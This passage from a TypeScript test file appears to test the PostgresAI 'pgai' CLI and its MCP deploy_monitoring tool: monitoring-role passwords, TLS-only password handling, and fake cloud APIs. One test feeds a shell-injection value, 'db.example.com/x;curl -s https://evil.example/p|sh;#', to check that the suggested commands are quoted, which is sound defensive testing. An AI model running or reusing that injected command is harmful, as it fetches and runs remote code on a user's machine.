    "the platform's stored password, with %s: the box's URL carries none",
    async (query) => {
      const s = server({ mon_exists: true });
      const result = await withMonPassword(undefined, () => s.prepare({ storedPassword: true }, `postgresql://postgres:adminpw@db.example.com:5432/app?${query}`));
      expect(result).toMatchObject({ storedPassword: true });
      expect(new URL((result as { monitoringUrl: string }).monitoringUrl).password).toBe("");
    },
  );

  test.each([
    ["", SSLMODE],
    ["?sslmode=prefer", SSLMODE],
    ["?sslmode=allow", SSLMODE],
    ["?sslmode=disable", SSLMODE],
    ["?sslmode=require&sslmode=require", `${SSLMODE}, once`],
    ["?sslmode=require&sslmode=disable", `${SSLMODE}, once`],
    ["?sslmode=require&", "no stray &"],
    ["?application_name=a&application_name=b&sslmode=require", "application_name once"],
    ["?application_name=a&application_name=b&sslmode=prefer&", `${SSLMODE} and application_name once and no stray &`],
    ["?application%5Fname=x&sslmode=require", "the parameter names without %-escapes"],
  ])(
    "the platform's stored password goes only over TLS, as the platform checks the URL: %p is refused before anything runs, with what it lacks",
    async (query, needs) => {
      const s = server({ mon_exists: true });
      const url = `postgresql://postgres:adminpw@db.example.com:5432/app${query}`;
      expect(await withMonPassword(undefined, () => s.prepare({ storedPassword: true }, url))).toEqual({ next: TLS_ONLY(needs) });
      expect(await withMonPassword(undefined, () => s.prepare({ storedPassword: true, check: true }, url))).toEqual({ next: TLS_ONLY(needs) });
      expect(s.ran).toEqual([]);
    },
  );

  // A server without TLS: the password PostgresAI keeps cannot reach it, so the way out is named.
  const OTHERS = { storedPassword: true, others: ["db.example.com/first"] };
  const NO_TLS = "this server takes no TLS, and PostgresAI sends the password it keeps for postgres_ai_mon only over TLS";
  const NO_TLS_WAY_OUT = "Set PGAI_MON_PASSWORD to its password, or turn on TLS on the server (ssl = on) and put sslmode=require in the URL. If nobody has the password: pgai mon instances delete db.example.com/first --yes, then re-run with --reset-password and PGAI_MON_PASSWORD set to a new one (and deploy db.example.com/first again with it)";
  const PLAIN = "postgresql://postgres:adminpw@db.example.com:5432/app";

  test("a server without TLS (the session fell back to plaintext), where the platform keeps the password: says so, and names the way out", async () => {
    const s = server({ name: "no-tls", mon_exists: true });
    const next = `postgres_ai_mon already exists on this server, but ${NO_TLS}. ${NO_TLS_WAY_OUT}`;
    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, PLAIN))).toEqual({ next });
    expect(await withMonPassword(undefined, () => s.prepare({ ...OTHERS, check: true }, PLAIN))).toEqual({ next });
    // sslmode=disable where the server has ssl off: the same.
    const off = server({ mon_exists: true, ssl: "off" });
    expect(await withMonPassword(undefined, () => off.prepare(OTHERS, `${PLAIN}?sslmode=disable`))).toEqual({ next });
    // Deleted by what pgai mon instances delete takes, deployed again by name.
    expect(await withMonPassword(undefined, () => s.prepare({ ...OTHERS, otherRefs: ["i-7"] }, PLAIN))).toEqual({
      next: next.replace("instances delete db.example.com/first --yes", "instances delete i-7 --yes"),
    });
    // Without the names (a direct call), the step is still named.
    expect(((await withMonPassword(undefined, () => s.prepare({ storedPassword: true }, PLAIN))) as { next: string }).next).toEndWith(
      "If nobody has the password: pgai mon instances delete the server's other databases (pgai mon instances list), then re-run with --reset-password and PGAI_MON_PASSWORD set to a new one (and deploy them again with it)",
    );
    expect([...s.ran, ...off.ran]).toEqual([]);
  });

  test("a server without TLS, and a PGAI_MON_PASSWORD that is not the role's: not told to unset it", async () => {
    const s = server({ name: "no-tls", mon_exists: true }, [pgError("28P01", "password authentication failed")]);
    expect(await withMonPassword("stale", () => s.prepare(OTHERS, PLAIN))).toEqual({
      next: `postgres_ai_mon already exists on this server and PGAI_MON_PASSWORD is not its password. This server takes no TLS, and PostgresAI sends the password it keeps for postgres_ai_mon only over TLS. ${NO_TLS_WAY_OUT}`,
    });
    expect(s.ran).toEqual([]);
  });

  test("an agent's URL on a server without TLS: the agent's way out, also where nobody has the password", async () => {
    const s = server({ mon_exists: true, ssl: "off" });
    expect(await s.prepare({ ...OTHERS, agent: true }, `${PLAIN}?sslmode=disable`)).toEqual({
      next: `postgres_ai_mon already exists on this server, but ${NO_TLS}. Pass its URL as database_url, or run pgai mon deploy in a terminal with PGAI_MON_PASSWORD set to its password. If nobody has it, in a terminal: pgai mon instances delete db.example.com/first --yes, then pgai mon deploy <admin-url> --reset-password with PGAI_MON_PASSWORD set to a new one (and deploy db.example.com/first again with it)`,
    });
    expect(((await s.prepare({ storedPassword: true, agent: true }, `${PLAIN}?sslmode=disable`)) as { next: string }).next).toEndWith(
      "If nobody has it, in a terminal: pgai mon instances delete the server's other databases (pgai mon instances list), then pgai mon deploy <admin-url> --reset-password with PGAI_MON_PASSWORD set to a new one (and deploy them again with it)",
    );
    expect(s.ran).toEqual([]);
  });

  test("names the way out tells the user to type are quoted where a shell would read them", async () => {
    const s = server({ name: "no-tls", mon_exists: true });
    const others = ["[2001:db8::1]:5432/app", "db.example.com/x;curl -s https://evil.example/p|sh;#", "db.example.com/it's"];
    expect(((await withMonPassword(undefined, () => s.prepare({ storedPassword: true, others }, PLAIN))) as { next: string }).next).toEndWith(
      "If nobody has the password: pgai mon instances delete '[2001:db8::1]:5432/app' --yes and pgai mon instances delete 'db.example.com/x;curl -s https://evil.example/p|sh;#' --yes and pgai mon instances delete 'db.example.com/it'\\''s' --yes, then re-run with --reset-password and PGAI_MON_PASSWORD set to a new one (and deploy [2001:db8::1]:5432/app, db.example.com/x;curl -s https://evil.example/p|sh;#, db.example.com/it's again with it)",
    );
  });

  test("a TLS session to a server whose ssl setting is off (a pooler that ends TLS, say): the stored password is used, and a URL that lacks something is told what", async () => {
    const s = server({ mon_exists: true, ssl: "off" });
    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, `${PLAIN}?sslmode=require`))).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon@db.example.com:5432/app?sslmode=require", storedPassword: true,
    });
    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, `${PLAIN}?sslmode=require&`))).toEqual({ next: TLS_ONLY("no stray &") });
    // sslmode=prefer: the session took TLS.
    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, `${PLAIN}?sslmode=prefer`))).toEqual({ next: TLS_ONLY(SSLMODE) });
  });

  test("a server without TLS and a PGAI_MON_PASSWORD this host may not check (pg_hba): not told to unset it", async () => {
    const s = server({ mon_exists: true, ssl: "off" }, [pgError("28000", "no pg_hba.conf entry for host")]);
    expect(await withMonPassword("its-password", () => s.prepare(OTHERS, `${PLAIN}?sslmode=disable`))).toEqual({
      next: "postgres_ai_mon already exists on this server, and PGAI_MON_PASSWORD could not be checked from this host (no pg_hba.conf entry for host). Run pgai mon deploy from a host that postgres_ai_mon may connect from",
    });
  });

  test("sslmode=disable where the server has TLS: the URL needs sslmode=require, not the way out of a server without TLS", async () => {
    const s = server({ mon_exists: true, ssl: "on" });
    expect(await withMonPassword(undefined, () => s.prepare(OTHERS, `${PLAIN}?sslmode=disable`))).toEqual({ next: TLS_ONLY(SSLMODE) });
  });

  test("an agent's URL: the platform's stored password is used (PGAI_MON_PASSWORD is not read), over TLS only", async () => {
    const s = server({ mon_exists: true });
    expect(await withMonPassword("from-the-environment", () => s.prepare({ storedPassword: true, agent: true }))).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon@db.example.com:5432/app?sslmode=require&application_name=pgai", storedPassword: true,
    });
    expect(s.monLogins).toEqual([]);
    const plain = server({ mon_exists: true });
    expect(await plain.prepare({ storedPassword: true, agent: true }, "postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=disable")).toEqual({
      next: TLS_ONLY(SSLMODE, "database_url"),
    });
    expect(plain.ran).toEqual([]);
  });

  test("the platform keeps the password, and PGAI_MON_PASSWORD is set: it is checked and used, as without the platform's", async () => {
    const s = server({ mon_exists: true }, ["ok", pgError("28P01", "password authentication failed"), "ok"]);
    expect(await withMonPassword("right", () => s.prepare({ storedPassword: true }))).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:right@db.example.com:5432/app?sslmode=require&application_name=pgai",
    });
    expect(s.monLogins[0]).toBe("right");
  });

  test("the platform keeps the password, and PGAI_MON_PASSWORD is not it: unset it (and use TLS)", async () => {
    const s = server({ mon_exists: true }, [pgError("28P01", "password authentication failed")]);
    expect(await withMonPassword("stale", () => s.prepare({ storedPassword: true }))).toEqual({
      next: "postgres_ai_mon already exists on this server and PGAI_MON_PASSWORD is not its password. Unset PGAI_MON_PASSWORD: PostgresAI keeps the password of postgres_ai_mon for this server",
    });
    const plain = server({ mon_exists: true }, [pgError("28P01", "password authentication failed")]);
    expect(await withMonPassword("stale", () => plain.prepare({ storedPassword: true }, "postgresql://postgres:adminpw@db.example.com:5432/app"))).toEqual({
      next: "postgres_ai_mon already exists on this server and PGAI_MON_PASSWORD is not its password. Unset PGAI_MON_PASSWORD, and the URL needs sslmode=require (or verify-full): PostgresAI keeps the password of postgres_ai_mon for this server, and sends it only over TLS, to a URL with each parameter once",
    });
    expect([...s.ran, ...plain.ran]).toEqual([]);
  });

  test("the platform keeps the password, and --reset-password: a new password, and the box's URL carries it", async () => {
    const s = server({ mon_exists: true });
    const result = await withMonPassword(undefined, () => s.prepare({ storedPassword: true, resetPassword: true }));
    const password = new URL((result as { monitoringUrl: string }).monitoringUrl).password;
    expect(password.length).toBeGreaterThan(20);
    expect(result).toEqual({ monitoringUrl: `postgresql://postgres_ai_mon:${password}@db.example.com:5432/app?sslmode=require&application_name=pgai` });
    expect(s.sqls.some((q) => /alter user "?postgres_ai_mon"? with password 'SCRAM-SHA-256\$/.test(q))).toBe(true);
  });

  test("the platform keeps a password, but the role is not on the server: it is created, and the box's URL carries the new password", async () => {
    const s = server({ mon_exists: false });
    const result = await withMonPassword(undefined, () => s.prepare({ storedPassword: true }));
    const password = new URL((result as { monitoringUrl: string }).monitoringUrl).password;
    expect(password.length).toBeGreaterThan(20);
    expect(result).toEqual({ monitoringUrl: `postgresql://postgres_ai_mon:${password}@db.example.com:5432/app?sslmode=require&application_name=pgai`, generated: true });
  });

  test.each([false, true])("an existing role and no PGAI_MON_PASSWORD: resettable, no login tried (check: %p)", async (check) => {
    const s = server({ mon_exists: true });
    expect(await withMonPassword(undefined, () => s.prepare({ check }))).toEqual({ next: `postgres_ai_mon already exists on this server. ${SET_PASSWORD}`, resettable: true });
    expect(s.monLogins).toEqual([]);
    expect(s.ran).toEqual([]);
  });

  test("a role someone else created while the plan ran: its password is not ours, refused after the plan", async () => {
    const s = server({ mon_exists: false }, [pgError("28P01", "password authentication failed")]);
    expect(await withMonPassword("ours", () => s.prepare())).toEqual({ next: `postgres_ai_mon was created by someone else meanwhile. ${SET_PASSWORD}` });
    expect(s.monLogins).toEqual(["ours"]);
    expect(s.ran.filter((q) => q === "begin;").length).toBeGreaterThan(0);
  });

  test("an existing role whose login this host may not even try (pg_hba): says so, nothing runs", async () => {
    const s = server({ mon_exists: true }, [pgError("28000", "no pg_hba.conf entry for host")]);
    expect(await withMonPassword("its-password", () => s.prepare())).toEqual({
      next: "postgres_ai_mon already exists on this server, and PGAI_MON_PASSWORD could not be checked from this host (no pg_hba.conf entry for host). Run pgai mon deploy from a host that postgres_ai_mon may connect from",
    });
    expect(s.ran).toEqual([]);
    // Where the platform keeps the password, no login is needed without PGAI_MON_PASSWORD.
    const stored = server({ mon_exists: true }, [pgError("28000", "no pg_hba.conf entry for host")]);
    expect(await withMonPassword("its-password", () => stored.prepare({ storedPassword: true }))).toEqual({
      next: "postgres_ai_mon already exists on this server, and PGAI_MON_PASSWORD could not be checked from this host (no pg_hba.conf entry for host). Run pgai mon deploy from a host that postgres_ai_mon may connect from, or unset PGAI_MON_PASSWORD: PostgresAI keeps its password for this server",
    });
  });

  test("a new role whose login this host may not try: prepared, the URL carries the password set", async () => {
    const s = server({ mon_exists: false }, [pgError("28000", "no pg_hba.conf entry for host")]);
    expect(await withMonPassword("ours", () => s.prepare())).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:ours@db.example.com:5432/app?sslmode=require&application_name=pgai",
    });
  });

  // `mon targets add` refuses a raw '@' after the host: it may be a raw '@' in a password.
  test.each([
    ["ops@team", "ops%40team"],
    ["a@b@c", "a%40b%40c"],
  ])("an '@' in the query reaches the box and the login percent-encoded, when no parameter is dropped: %p", async (raw, encoded) => {
    const s = server({ mon_exists: false }, [pgError("28000", "no pg_hba.conf entry for host")]);
    const url = `postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=require&application_name=${raw}`;
    expect(await withMonPassword("ours", () => s.prepare({}, url))).toEqual({
      monitoringUrl: `postgresql://postgres_ai_mon:ours@db.example.com:5432/app?sslmode=require&application_name=${encoded}`,
    });
    expect(s.monUrls.length).toBeGreaterThan(0);
    for (const monUrl of s.monUrls) expect(new URL(monUrl).search).toEndWith(`application_name=${encoded}`);
  });

  test("a server that accepts any password from this host: prepared, with a note that the password was not checked", async () => {
    const s = server({ mon_exists: true });
    expect(await withMonPassword("maybe", () => s.prepare())).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:maybe@db.example.com:5432/app?sslmode=require&application_name=pgai",
      note: "this server accepts any password from this host, so PGAI_MON_PASSWORD was not checked; if no data arrives, delete the instance (pgai mon instances delete) and deploy again with the right password",
    });
    expect(s.monLogins.length).toBe(3);
    expect(s.monLogins[1]).not.toBe("maybe");
  });

  test("an existing role and the right password on a server that checks it: prepared, no note", async () => {
    const s = server({ mon_exists: true }, ["ok", pgError("28P01", "password authentication failed"), "ok"]);
    expect(await withMonPassword("right", () => s.prepare())).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:right@db.example.com:5432/app?sslmode=require&application_name=pgai",
    });
  });

  test("a new role with a generated password is marked, so a refused launch can drop it; with PGAI_MON_PASSWORD it is not", async () => {
    const result = await withMonPassword(undefined, () => server({ mon_exists: false }).prepare());
    expect(result).toMatchObject({ generated: true });
    expect(await withMonPassword("ours", () => server({ mon_exists: false }).prepare())).not.toHaveProperty("generated");
  });

  test("a plan that fails after the role was created with a generated password: the role is dropped again", async () => {
    const s = server({ mon_exists: false, fails: /create extension/ });
    await expect(withMonPassword(undefined, () => s.prepare())).rejects.toThrow('Failed at step "02.extensions": permission denied');
    expect(s.ran.at(-1)).toBe('drop role "postgres_ai_mon"');
  });

  test("a plan that fails: a role with the user's PGAI_MON_PASSWORD, or one that does not log in with ours, is left alone", async () => {
    const mine = server({ mon_exists: false, fails: /create extension/ });
    await expect(withMonPassword("ours", () => mine.prepare())).rejects.toThrow('Failed at step "02.extensions"');
    const notOurs = server({ mon_exists: false, fails: /create extension/ }, [pgError("28P01", "password authentication failed")]);
    await expect(withMonPassword(undefined, () => notOurs.prepare())).rejects.toThrow('Failed at step "02.extensions"');
    for (const s of [mine, notOurs]) expect(s.ran.some((q) => q.startsWith("drop"))).toBe(false);
  });

  test("the MCP tool's prepare: PGAI_MON_PASSWORD is not read, and TLS is not given up", async () => {
    const existing = server({ mon_exists: true });
    expect(await withMonPassword("its-password", () => existing.prepare({ agent: true }))).toEqual({
      next: "postgres_ai_mon already exists on this server. Pass its URL as database_url, or run pgai mon deploy in a terminal with PGAI_MON_PASSWORD set to its password",
    });
    expect(existing.monLogins).toEqual([]);

    const created = server({ mon_exists: false });
    const result = await withMonPassword("from-the-environment", () => created.prepare({ agent: true }));
    expect(JSON.stringify(result)).not.toContain("from-the-environment");
    expect(result).toHaveProperty("monitoringUrl");

    // A server without TLS and a URL that does not ask for a mode: the CLI retries in plaintext, the tool does not.
    const noTls = server({ name: "no-tls", mon_exists: false });
    const url = "postgresql://postgres:adminpw@db.example.com:5432/app";
    await expect(noTls.prepare({ agent: true }, url)).rejects.toThrow("The server does not support SSL connections");
    expect(await noTls.prepare({}, url)).toHaveProperty("monitoringUrl");
  });

  // The first login in these is the given URL's own session; the second is the random-password probe.
  const MON_URL = "postgresql://postgres_ai_mon:its-password@db.example.com:5432/app?sslmode=require";
  const REJECTED = pgError("28P01", "password authentication failed");

  test("a query password overrides the authority password in the prepared monitoring URL", async () => {
    const s = server({ name: "postgres_ai_mon", mon_exists: true }, ["ok", REJECTED]);
    const result = await s.prepare({}, "postgresql://postgres_ai_mon:old@db.example.com:5432/app?password=right&sslmode=require");
    expect(s.monLogins[0]).toBe("right");
    expect(new URL((result as { monitoringUrl: string }).monitoringUrl).password).toBe("right");
  });

  test("a postgres_ai_mon URL on a server that checks passwords: its URL, no note", async () => {
    const s = server({ name: "postgres_ai_mon", mon_exists: true }, ["ok", REJECTED]);
    expect(await s.prepare({}, MON_URL)).toEqual({ monitoringUrl: MON_URL });
    expect(s.monLogins.length).toBe(2);
    expect(s.monLogins[1]).not.toBe("its-password");
  });

  test("a postgres_ai_mon URL on a server that accepts any password: a note that the URL's password was not checked", async () => {
    const s = server({ name: "postgres_ai_mon", mon_exists: true });
    expect(await s.prepare({}, MON_URL)).toEqual({
      monitoringUrl: MON_URL,
      note: "this server accepts any password from this host, so the password in the URL was not checked; if no data arrives, delete the instance (pgai mon instances delete) and deploy again with the right password",
    });
  });

  test("a postgres_ai_mon URL without a password: PGPASSWORD is used only when the server checked it", async () => {
    const bare = "postgresql://postgres_ai_mon@db.example.com:5432/app?sslmode=require";
    process.env.PGPASSWORD = "unrelated-secret";
    try {
      const trusting = await server({ name: "postgres_ai_mon", mon_exists: true }).prepare({}, bare);
      expect(trusting).toEqual({ next: "This server accepts any password from this host, so the one from the environment was not checked and is not used. Put the password of postgres_ai_mon in the URL: the monitoring box logs in with it" });
      expect(JSON.stringify(trusting)).not.toContain("unrelated-secret");
      expect(await server({ name: "postgres_ai_mon", mon_exists: true }, ["ok", REJECTED]).prepare({}, bare)).toEqual({
        monitoringUrl: "postgresql://postgres_ai_mon:unrelated-secret@db.example.com:5432/app?sslmode=require",
      });
    } finally {
      delete process.env.PGPASSWORD;
    }
  });

  test("a private CA (sslrootcert): the logins from this machine use it, the box's URL does not carry it, and next says so", async () => {
    const url = "postgresql://postgres:adminpw@db.example.com:5432/app?sslmode=verify-full&sslrootcert=%2Ftmp%2Fca.pem&sslcert=%2Ftmp%2Fc.pem&sslkey=%2Ftmp%2Fk.pem&options=-c%20role%3Dx&user=postgres";
    const CA_NOTE = "the monitoring box has no copy of the CA in sslrootcert: with sslmode=verify-full it connects only to a server certificate signed by a public CA (else use sslmode=require)";
    const s = server({ mon_exists: true }, ["ok", REJECTED, "ok"]);
    expect(await withMonPassword("right", () => s.prepare({}, url))).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:right@db.example.com:5432/app?sslmode=verify-full",
      note: CA_NOTE,
    });
    // Pre-check, probe, post-plan check: the TLS files, and nothing else of the admin's session.
    expect(s.monUrls.length).toBe(3);
    for (const u of s.monUrls) expect([...new URL(u).searchParams.keys()].sort()).toEqual(["sslcert", "sslkey", "sslrootcert"]);

    // The monitoring role's own URL: the same note; with a trusting server, both.
    const own = await server({ name: "postgres_ai_mon", mon_exists: true }).prepare({}, "postgresql://postgres_ai_mon:pw@db.example.com/app?sslmode=verify-ca&sslrootcert=%2Ftmp%2Fca.pem");
    expect(own).toEqual({
      monitoringUrl: "postgresql://postgres_ai_mon:pw@db.example.com/app?sslmode=verify-ca",
      note: `${CA_NOTE.replace("verify-full", "verify-ca")}; this server accepts any password from this host, so the password in the URL was not checked; if no data arrives, delete the instance (pgai mon instances delete) and deploy again with the right password`,
    });
    // sslmode=require does not verify at the box: nothing to say.
    expect(await withMonPassword("ours", () => server({ mon_exists: false }).prepare())).not.toHaveProperty("note");
  });

  test("a role that may not grant pg_monitor: the SQL to run, nothing created", async () => {
    const s = server({ admin: false, mon_exists: false });
    const result = await s.prepare();
    expect((result as { next: string }).next).toBe("Run the SQL as an admin, with a password of your choice in place of <redacted> (or re-run with an admin URL), then pgai mon deploy again with the postgres_ai_mon URL");
    expect((result as { sql: string }).sql).toContain("-- 01.role");
    expect((result as { sql: string }).sql).toContain("begin;\n");
    expect((result as { sql: string }).sql).toContain("do $pgai_optional_outer_0$");
    expect((result as { sql: string }).sql).toMatch(/\ncommit;$/);
    expect(s.ran).toEqual([]);
  });
});

describe("clickhouseOrgFor (a fake ClickHouse Cloud API)", () => {
  const OTHER = "99999999-8888-7777-6666-555555555555";
  const SERVICE = "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee";
  async function withApi(orgsStatus: number, fn: () => Promise<void>, otherStatus = 200, orgsBody?: unknown) {
    const seen: string[] = [];
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      fetch(req) {
        const path = new URL(req.url).pathname;
        seen.push(`${req.headers.get("authorization")?.slice(0, 6)} ${path}`);
        const json = (result: unknown) => Response.json({ result });
        if (path === "/v1/organizations" && orgsBody) return Response.json(orgsBody);
        if (path === "/v1/organizations") return orgsStatus === 200 ? json([{ id: OTHER }, { id: ORG }]) : new Response("", { status: orgsStatus });
        if (path === `/v1/organizations/${OTHER}/postgres`) return otherStatus === 200 ? json([]) : new Response("", { status: otherStatus });
        if (path === `/v1/organizations/${ORG}/postgres`) return json([{ id: SERVICE, name: "svc", state: "running" }]);
        if (path === `/v1/organizations/${ORG}/postgres/${SERVICE}`) return json({ id: SERVICE, name: "svc", state: "running", hostname: "abc123.us-east-1.aws.pg.clickhouse.cloud" });
        return new Response("", { status: 404 });
      },
    });
    process.env.CLICKHOUSE_API_URL = `http://127.0.0.1:${server.port}`;
    try {
      await fn();
    } finally {
      delete process.env.CLICKHOUSE_API_URL;
      server.stop(true);
    }
    return seen;
  }

  test("the key's organization that runs the host, with Basic auth", async () => {
    const seen = await withApi(200, async () => {
      expect(await clickhouseOrgFor("abc123.us-east-1.aws.pg.clickhouse.cloud", "kid", "secret")).toEqual({ orgId: ORG, state: "running" });
    });
    expect(seen[0]).toBe("Basic  /v1/organizations");
  });

  test("a rejected key and an unknown host are clear errors", async () => {
    await withApi(401, async () => {
      await expect(clickhouseOrgFor("x.pg.clickhouse.cloud", "kid", "bad")).rejects.toThrow("ClickHouse Cloud rejected the API key (401)");
      // The user's to fix (exit 3), unlike an API outage.
      await expect(clickhouseOrgFor("x.pg.clickhouse.cloud", "kid", "bad")).rejects.toBeInstanceOf(ClickhouseKeyError);
    });
    await withApi(200, async () => {
      await expect(clickhouseOrgFor("nope.pg.clickhouse.cloud", "kid", "secret")).rejects.toThrow("has hostname nope.pg.clickhouse.cloud");
      await expect(clickhouseOrgFor("nope.pg.clickhouse.cloud", "kid", "secret")).rejects.toBeInstanceOf(ClickhouseKeyError);
    });
  });

  test("a key that cannot read the services (403) is the user's to fix too, not an outage", async () => {
    await withApi(200, async () => {
      await expect(clickhouseOrgFor("nope.pg.clickhouse.cloud", "kid", "secret")).rejects.toBeInstanceOf(ClickhouseKeyError);
    }, 403);
  });

  test("an organization the key cannot read is reported, not the next one's missing service", async () => {
    await withApi(200, async () => {
      await expect(clickhouseOrgFor("nope.pg.clickhouse.cloud", "kid", "secret")).rejects.toThrow(`cannot read Postgres services in organization ${OTHER} (403)`);
    }, 403);
  });

  test("a response without an organization list is a clear error", async () => {
    await withApi(200, async () => {
      await expect(clickhouseOrgFor("x.pg.clickhouse.cloud", "kid", "secret")).rejects.toThrow("ClickHouse Cloud API returned no organization list.");
    }, 200, {});
  });
});

describe("MCP deploy_monitoring", () => {
  test("same JSON as the CLI; RDS hands off to the console with the org's alias", async () => {
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      fetch(req) {
        const path = new URL(req.url).pathname;
        if (path.endsWith("/rpc/cloud_monitoring_list")) return Response.json([row("active")]);
        if (path.endsWith("/rpc/orgs_list")) return Response.json([{ org_id: 7, alias: "acme", name: "Acme", is_active: true }]);
        if (path.endsWith("/rpc/projects_list")) return Response.json([{ project_id: 3, alias: "abc-db", name: CH_NAME, monitoring_instance_ids: ["i-1"] }]);
        return new Response("not found", { status: 404 });
      },
    });
    const opts = { apiKey: "k", apiBaseUrl: `http://127.0.0.1:${server.port}`, uiBaseUrl: "https://console.example" };
    const call = async (args: Record<string, unknown>) =>
      JSON.parse((await handleToolCall({ params: { name: "deploy_monitoring", arguments: args } }, opts)).content[0].text);
    try {
      // The Health Matrix first; Grafana through the PostgresAI sign-in.
      expect(await call({ database_url: CH })).toEqual({
        status: "ready", provider: "clickhouse", name: CH_NAME, id: "i-1",
        health_url: "https://console.example/acme/projects/abc-db/health",
        dashboard_url: "https://abc.pgai.watch/login/generic_oauth?redirectTo=%2F", host_metrics: true,
        next: "Open https://console.example/acme/projects/abc-db/health",
      });
      expect((await call({ database_url: "postgresql://u:p@db.abc.us-east-1.rds.amazonaws.com:5432/app" })).next)
        .toBe("Finish in the console: https://console.example/acme/monitoring/scale/create/rds");
    } finally {
      server.stop(true);
    }
  });

  test("Supabase without a connection: the consent link to open, then call again (no wait, not an error)", async () => {
    const bodies: Record<string, unknown>[] = [];
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      async fetch(req) {
        const path = new URL(req.url).pathname;
        if (path.endsWith("/rpc/cloud_monitoring_list")) return Response.json([]);
        if (path.endsWith("/rpc/cloud_monitoring_supabase_start")) {
          bodies.push((await req.json()) as Record<string, unknown>);
          return Response.json({ auth_url: "https://api.supabase.com/v1/oauth/authorize?state=s", session_id: "sess-1" });
        }
        return new Response("not found", { status: 404 });
      },
    });
    const opts = { apiKey: "k", apiBaseUrl: `http://127.0.0.1:${server.port}`, uiBaseUrl: "https://console.example" };
    try {
      const reply = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: "postgresql://postgres:pw@db.abcdefghijklmnopqrst.supabase.co:5432/postgres" } } }, opts);
      expect(reply.isError).toBe(false);
      expect(JSON.parse(reply.content[0].text)).toEqual({
        status: "action_required", provider: "supabase", name: "db.abcdefghijklmnopqrst.supabase.co/postgres",
        next: "Open https://api.supabase.com/v1/oauth/authorize?state=s in a browser and approve PostgresAI's access to Supabase, then call deploy_monitoring again",
      });
      // The password never leaves this machine.
      expect(bodies).toEqual([{ db_url: "postgresql://db.abcdefghijklmnopqrst.supabase.co:5432/postgres" }]);
    } finally {
      server.stop(true);
    }
  });

  test("cloud and location reach the platform's placing; without yes the place and choices come back (A17)", async () => {
    const asked: Record<string, unknown>[] = [];
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      async fetch(req) {
        const path = new URL(req.url).pathname;
        if (path.endsWith("/rpc/cloud_monitoring_list")) return Response.json([]);
        if (path.endsWith("/rpc/cloud_monitoring_supabase_start")) return Response.json({ connected: true, project_ref: "abcdefghijklmnopqrst" });
        if (path.endsWith("/rpc/monitoring_deploy_options")) {
          asked.push((await req.json()) as Record<string, unknown>);
          return Response.json({ clouds: [{ code: "aws", label: "AWS", available: true }, { code: "hetzner", label: "Hetzner", available: true }],
            locations: { aws: [{ code: "eu-central-1", label: "Europe (Frankfurt)", world_part: "Europe" }], hetzner: [{ code: "fsn1", label: "DE Falkenstein", world_part: "Europe" }] },
            choice: { cloud: "hetzner", cloud_label: "Hetzner", location: "fsn1", location_label: "DE Falkenstein", reason: "explicit", reason_text: "your choice" }, error: null });
        }
        if (path.endsWith("/rpc/cloud_monitoring_quote")) {
          return Response.json({ plan: "scale", org_alias: "acme", billed: false, free_slots: { remaining: 1, total: 2 }, subscription: false, quantity: 0,
            price: { amount: 50000, currency: "usd", interval: "month" }, has_payment_method: true, requires_payment_method: false });
        }
        return new Response("not found", { status: 404 });
      },
    });
    const opts = { apiKey: "k", apiBaseUrl: `http://127.0.0.1:${server.port}`, uiBaseUrl: "https://console.example" };
    try {
      const reply = await handleToolCall({ params: { name: "deploy_monitoring", arguments: {
        database_url: "postgresql://postgres:pw@db.abcdefghijklmnopqrst.supabase.co:5432/postgres", cloud: "hetzner", location: "fsn1" } } }, opts);
      const result = JSON.parse(reply.content[0].text);
      expect(asked[0]).toMatchObject({ cloud: "hetzner", location: "fsn1" });
      expect(result).toMatchObject({ status: "action_required", cloud: "hetzner", location: "fsn1", choices: { aws: ["eu-central-1"], hetzner: ["fsn1"] } });
      expect(result.next).toContain("call deploy_monitoring again with yes: true");
    } finally {
      server.stop(true);
    }
  });

  test("monitoring_user reaches mon deploy's checks", async () => {
    const opts = { apiKey: "k", apiBaseUrl: "http://127.0.0.1:9", uiBaseUrl: "https://console.example" };
    const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: CH, monitoring_user: "m".repeat(64) } } }, opts);
    expect(JSON.parse(result.content[0].text).next).toBe("monitoring_user must be at most 63 bytes (Postgres truncates longer role names)");
  });

  test("an empty monitoring_user is refused, not taken as the default", async () => {
    const opts = { apiKey: "k", apiBaseUrl: "http://127.0.0.1:9", uiBaseUrl: "https://console.example" };
    const result = await handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: CH, monitoring_user: "" } } }, opts);
    expect(JSON.parse(result.content[0].text).next).toBe("monitoring_user is empty: pass a role name, or leave it out for postgres_ai_mon");
  });

  test("a box still provisioning is answered at once (no wait); a failed one is an error result", async () => {
    let status = "launch_requested";
    const server = Bun.serve({
      hostname: "127.0.0.1", port: 0,
      fetch: () => Response.json([row(status)]),
    });
    const opts = { apiKey: "k", apiBaseUrl: `http://127.0.0.1:${server.port}`, uiBaseUrl: "https://console.example" };
    const call = () => handleToolCall({ params: { name: "deploy_monitoring", arguments: { database_url: CH } } }, opts);
    try {
      const started = Date.now();
      const provisioning = await call();
      expect(Date.now() - started).toBeLessThan(3000);
      expect(provisioning.isError).toBe(false);
      expect(JSON.parse(provisioning.content[0].text)).toEqual({
        status: "in_progress", provider: "clickhouse", name: CH_NAME, id: "i-1", dashboard_url: null, host_metrics: true, next: "pgai mon instances watch i-1",
      });
      status = "failed";
      const failed = await call();
      expect(failed.isError).toBe(true);
      expect(JSON.parse(failed.content[0].text).status).toBe("failed");
    } finally {
      server.stop(true);
    }
  });

